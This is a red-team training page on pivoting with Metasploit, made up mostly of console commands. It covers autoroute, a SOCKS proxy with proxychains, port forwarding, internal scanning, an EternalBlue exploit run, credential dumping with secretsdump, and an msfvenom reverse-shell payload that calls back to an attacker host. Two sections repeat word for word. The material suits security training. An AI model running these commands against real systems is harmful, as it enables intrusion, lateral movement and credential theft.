---
layout: training-page
title: "Metasploit Pivoting — Red Team Academy"
module: "Pivoting & Tunneling"
tags:
  - metasploit
  - autoroute
  - socks-proxy
  - portfwd
page_key: "pivoting-metasploit"
render_with_liquid: false
---

# Metasploit Pivoting

## Overview

Metasploit has built-in pivoting capabilities that work through any active Meterpreter session. The two primary mechanisms are `autoroute` (which tells MSF to route traffic through the session) and `socks_proxy` (which creates a SOCKS proxy for external tools). Combined with `portfwd` for specific port redirects, these cover most pivoting scenarios.

![Metasploit pivoting: msfconsole autoroute and socks_proxy through Meterpreter session on pivot host to reach internal 172.16.5.0/24 network with DC, RDP, and web targets](/images/pivoting/msf-pivoting-flow.svg)  
*// metasploit pivoting — autoroute + socks proxy through meterpreter session*

## Network Enumeration from Meterpreter

Before setting up routes, identify what networks are reachable from the compromised host.

```
# From active Meterpreter session:
meterpreter > ipconfig
# Lists all network interfaces and addresses
# Identifies pivot host's network membership

meterpreter > arp
# ARP cache — shows recently contacted hosts

meterpreter > run post/multi/manage/shell_to_meterpreter
# Upgrade shell to Meterpreter if needed

# Run network recon from session:
meterpreter > run post/multi/recon/local_exploit_suggester
meterpreter > run arp_scanner RHOSTS=172.16.5.0/24
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/24
```

## autoroute — Add Routes Through Session

`autoroute` tells Metasploit to route traffic destined for a subnet through the Meterpreter session. All MSF modules will automatically route through the pivot.

```
># Background the session first:
meterpreter > background
# or: Ctrl+Z

# Add route to internal subnet via session 1:
msf6 > use post/multi/manage/autoroute
msf6 post(autoroute) > set SESSION 1
msf6 post(autoroute) > set SUBNET 172.16.5.0/24
msf6 post(autoroute) > run

# Alternative — direct route add from msf console:
msf6 > route add 172.16.5.0/24 1
# route add [subnet] [session_id]

# Autoroute automatic subnet detection:
msf6 post(autoroute) > set SUBNET 0.0.0.0/0  # auto-detect
msf6 post(autoroute) > run

# View active routes:
msf6 > route print

# Remove a route:
msf6 > route del 172.16.5.0/24 1

# Flush all routes:
msf6 > route flush
```

## MSF Route Management

Managing routes is central to multi-hop pivoting. The `route` command in the MSF console gives full control over the routing table.

```
# Add a route — subnet/mask, session ID:
msf6 > route add 172.16.5.0/24 1
msf6 > route add 192.168.10.0 255.255.255.0 2   # CIDR or mask notation both work

# Print all active routes (shows subnet, mask, gateway session):
msf6 > route print

# Active Routing Table
# ===================
# Subnet             Netmask            Gateway
# ------             -------            -------
# 172.16.5.0         255.255.255.0      Session 1
# 192.168.10.0       255.255.255.0      Session 2

# Delete a specific route:
msf6 > route del 172.16.5.0/24 1

# Flush ALL routes (clean slate):
msf6 > route flush

# Routes persist only for the current MSF session — re-add after restart
# To persist routes across MSF restarts, add to ~/.msf4/msfconsole.rc:
# route add 172.16.5.0/24 1

# Verify which session handles a route:
msf6 > route print
# Cross-reference with: sessions -l
```

## socks_proxy — SOCKS Proxy for External Tools

With routes established, the `socks_proxy` auxiliary module creates a SOCKS proxy server. External tools (nmap, proxychains) route through the Meterpreter session via this proxy.

```
># After setting up autoroute, start SOCKS proxy:
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(socks_proxy) > set SRVPORT 9050
msf6 auxiliary(socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(socks_proxy) > set VERSION 5
msf6 auxiliary(socks_proxy) > run -j  # run as background job

# Verify proxy is listening:
msf6 > jobs
ss -tlnp | grep 9050

# Configure proxychains:
# /etc/proxychains.conf:
# socks5 127.0.0.1 9050

# Use external tools through the proxy:
proxychains nmap -sT -p 22,80,443,445,3389 172.16.5.0/24
proxychains evil-winrm -i 172.16.5.19 -u Administrator -p 'Password123!'
proxychains impacket-smbexec CORP/Administrator:'Password123!'@172.16.5.19
```

## portfwd — Meterpreter Port Forwarding

`portfwd` creates direct port forwards through a Meterpreter session without requiring a SOCKS proxy. Best for accessing a specific service on one internal host.

```
># From Meterpreter session:
# Forward local port 3389 → internal 172.16.5.19:3389
meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.5.19
# -l: local port to listen on
# -p: remote port to forward to
# -r: remote host

# Forward local 8080 → internal web server:
meterpreter > portfwd add -l 8080 -p 80 -r 172.16.5.100

# List active forwards:
meterpreter > portfwd list

# Remove a forward:
meterpreter > portfwd delete -l 3389

# Flush all forwards:
meterpreter > portfwd flush

# After portfwd, connect directly:
xfreerdp /v:localhost:3389 /u:Administrator /p:'Password123!'
curl http://localhost:8080
```

## MSF AutoRoute for Automatic Routing

The `post/multi/manage/autoroute` module can automatically enumerate and add routes based on what the Meterpreter session can see — no manual subnet specification required.

```
># Method 1: Auto-detect routes from the session's routing table
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > set CMD autoadd
msf6 post(multi/manage/autoroute) > run
# MSF reads the pivot's routing table and adds reachable subnets automatically

# Method 2: Print current routes from the session
msf6 post(multi/manage/autoroute) > set CMD print
msf6 post(multi/manage/autoroute) > run

# Method 3: Add a specific subnet
msf6 post(multi/manage/autoroute) > set CMD add
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
msf6 post(multi/manage/autoroute) > set NETMASK /24
msf6 post(multi/manage/autoroute) > run

# Method 4: Delete a route via autoroute module
msf6 post(multi/manage/autoroute) > set CMD delete
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
msf6 post(multi/manage/autoroute) > run

# Shortcut: run autoroute inline from Meterpreter:
meterpreter > run post/multi/manage/autoroute CMD=autoadd
```

## MSF Scanner Modules Through Routes

With autoroute configured, any MSF auxiliary module targets the internal network directly — no proxychains needed.

```
># Port scan internal subnet through the pivot:
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(tcp) > set RHOSTS 172.16.5.0/24
msf6 auxiliary(tcp) > set PORTS 22,80,443,445,3389,5985
msf6 auxiliary(tcp) > set THREADS 10
msf6 auxiliary(tcp) > run

# SMB enumeration through pivot:
msf6 > use auxiliary/scanner/smb/smb_enumshares
msf6 auxiliary(smb_enumshares) > set RHOSTS 172.16.5.0/24
msf6 auxiliary(smb_enumshares) > run

# Check for MS17-010 (EternalBlue) internally:
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(smb_ms17_010) > set RHOSTS 172.16.5.0/24
msf6 auxiliary(smb_ms17_010) > run

# Exploit module targets internal host via route:
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 172.16.5.25
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/bind_tcp
# Use bind payload (not reverse) when pivoting through sessions
msf6 exploit(ms17_010_eternalblue) > run
```

## Bind vs Reverse Payloads When Pivoting

When pivoting with Metasploit routes, callback direction matters. Reverse payloads from internal hosts may not reach your attack box directly — use bind payloads or route the reverse callback through the pivot.

```
># Problem: internal host 172.16.5.25 can't route to your attack box
# Solution: use bind_tcp payload (you connect to it via the route)

# Bind payload:
set PAYLOAD windows/x64/meterpreter/bind_tcp
set RHOST 172.16.5.25
# MSF connects out to 172.16.5.25:4444 via autoroute

# Alternative: reverse_tcp through the pivot Meterpreter session
# Use multi/manage/autoroute to ensure the reverse callback routes correctly
# Or: set LHOST to the pivot's IP, the pivot forwards back to you via portfwd

# Check which payload types work:
# bind_tcp = you initiate, good for pivoting
# reverse_tcp = target initiates, needs return path to your LHOST
# reverse_tcp via autoroute: set LHOST to pivot's internal IP,
#   portfwd the LHOST:LPORT back to attack box
```

## Multi-Hop Pivoting

Chain Meterpreter sessions across multiple network segments by adding routes on each new pivot session.

```
># Layer 1: Pivot1 session (ID 1) — reaches 172.16.5.0/24
msf6 > route add 172.16.5.0/24 1

# Compromise Pivot2 (172.16.5.19) through the route
# Pivot2 session opens as session ID 2

# Layer 2: Add route to deeper network via Pivot2 session (ID 2)
msf6 > route add 192.168.10.0/24 2

# Now MSF can reach 192.168.10.0/24 through session 1 → session 2

# View full routing table:
msf6 > route print

# Tip: start socks_proxy before starting second hop —
# existing proxy will route through both layers
```

## Combining MSF Pivot with External Tools via Proxychains

The SOCKS proxy created by `auxiliary/server/socks_proxy` exposes the MSF route table to any proxychains-compatible external tool.

```
# Full workflow: MSF route + SOCKS proxy + external tools

# Step 1: Get Meterpreter session on pivot
msf6 > sessions -l
# Active sessions
# ===============
#   Id  Name  Type                     ...
#   1         meterpreter x64/linux    ...

# Step 2: Add autoroute to internal subnet
msf6 > use post/multi/manage/autoroute
msf6 post(autoroute) > set SESSION 1
msf6 post(autoroute) > set CMD autoadd
msf6 post(autoroute) > run

# Step 3: Start SOCKS5 proxy
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(socks_proxy) > set SRVPORT 9050
msf6 auxiliary(socks_proxy) > set VERSION 5
msf6 auxiliary(socks_proxy) > run -j

# Step 4: Configure proxychains
# /etc/proxychains4.conf:
# socks5  127.0.0.1  9050

# Step 5: Use impacket, crackmapexec, evil-winrm through MSF proxy
proxychains crackmapexec smb 172.16.5.0/24 -u Administrator -p 'Password123!'
proxychains python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
    CORP/Administrator:'Password123!'@172.16.5.19
proxychains python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
    CORP/Administrator:'Password123!'@172.16.5.19

# Step 6: Nmap through MSF SOCKS proxy (TCP connect only)
proxychains nmap -sT -Pn -p 22,80,443,445,3389,5985 172.16.5.0/24

# Stop the SOCKS proxy job when done:
msf6 > jobs -K
# Or kill specific job:
msf6 > jobs -l
msf6 > kill 0
```

## Multi-Layer Pivoting

Chain Meterpreter sessions across multiple network segments by adding routes on each new pivot session.

```
># Layer 1: Pivot1 session (ID 1) — reaches 172.16.5.0/24
msf6 > route add 172.16.5.0/24 1

# Compromise Pivot2 (172.16.5.19) through the route
# Pivot2 session opens as session ID 2

# Layer 2: Add route to deeper network via Pivot2 session (ID 2)
msf6 > route add 192.168.10.0/24 2

# Now MSF can reach 192.168.10.0/24 through session 1 → session 2

# View full routing table:
msf6 > route print

# Tip: start socks_proxy before starting second hop —
# existing proxy will route through both layers
```

## Ping Sweep from Meterpreter Session

Discover live hosts on an internal network before scanning. Multiple methods work depending on what's available on the pivot host.

```
# Meterpreter built-in ping sweep module:
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

# Bash one-liner on Linux pivot (background each ping):
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done

# CMD for loop on Windows pivot:
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

# PowerShell ping sweep:
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}

# Note: run ping sweep twice — first pass builds ARP cache for more reliable results
```

## Meterpreter Reverse Port Forward

Use `portfwd -R` to forward ports on the pivot back to your attack box — useful when an internal Windows host needs to connect back through the pivot to your MSF listener.

```
# Scenario: Windows target at 172.16.5.x cannot route to attack box directly.
# Setup: payload on Windows connects to pivot:1234, pivot forwards to attack box:8081

# Step 1: On pivot Meterpreter — create reverse port forward:
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
# pivot listens on :1234, any connection forwarded to 10.10.14.18:8081

# Step 2: Start MSF listener on attack box:
meterpreter > bg
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
msf6 exploit(multi/handler) > run

# Step 3: Generate Windows payload targeting pivot's internal IP:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o payload.exe LPORT=1234

# Execute on Windows → connects to pivot:1234 → attack box:8081
```

## Resources

- Metasploit Documentation — https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html
- MSF post/multi/manage/autoroute — built-in, run `info post/multi/manage/autoroute`
- MSF auxiliary/server/socks_proxy — built-in, run `info auxiliary/server/socks_proxy`
- MITRE T1090 — Proxy
- MITRE T1572 — Protocol Tunneling
- MITRE T1021 — Remote Services
